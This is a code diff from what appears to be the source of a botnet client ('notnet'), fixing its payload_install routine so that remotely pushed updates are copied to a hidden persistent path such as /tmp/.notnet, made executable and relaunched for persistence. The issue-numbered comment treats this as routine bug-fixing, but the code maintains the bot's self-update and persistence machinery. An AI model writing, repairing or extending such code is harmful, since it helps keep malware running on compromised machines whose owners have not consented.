@@ -582,27 +582,38 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
         return -1;
     }
 
-    /* Copy binary to persistent location */
+    /* Copy binary to persistent location. (#108): the destination comes
+     * from get_persist_path() (persist.c), NOT a hardcoded /tmp/.notnet.
+     * CMD_UPDATE passes bin_path="/tmp/.notnet" — the same path the
+     * download+verify renamed the temp file to — so a naive
+     * fopen(dest,"wb") truncated the SOURCE before the copy loop read it,
+     * and every SHA-verified update installed an EMPTY binary (exec exit
+     * 127, persistence relaunch broken). When source == dest the file is
+     * already in its persistent location: skip the copy. */
     char dest[256];
-    snprintf(dest, sizeof(dest), "/tmp/.notnet");
+    get_persist_path(dest, sizeof(dest));
 
-    FILE *src = fopen(bin_path, "rb");
-    FILE *dst = fopen(dest, "wb");
-    if (!src || !dst) {
-        log_error("Failed to copy payload");
-        if (src) fclose(src);
-        if (dst) fclose(dst);
-        return -1;
+    if (strcmp(bin_path, dest) != 0) {
+        FILE *src = fopen(bin_path, "rb");
+        FILE *dst = fopen(dest, "wb");
+        if (!src || !dst) {
+            log_error("Failed to copy payload");
+            if (src) fclose(src);
+            if (dst) fclose(dst);
+            return -1;
+        }
+
+        char buf[4096];
+        size_t n;
+        while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
+            fwrite(buf, 1, n, dst);
+        }
+
+        fclose(src);
+        fclose(dst);
+    } else {
+        log_info("payload_install: %s already at persistent path, skipping self-copy (#108)", dest);
     }
-
-    char buf[4096];
-    size_t n;
-    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
-        fwrite(buf, 1, n, dst);
-    }
-
-    fclose(src);
-    fclose(dst);
 
     /* Make copied binary executable */
     chmod(dest, 0755);
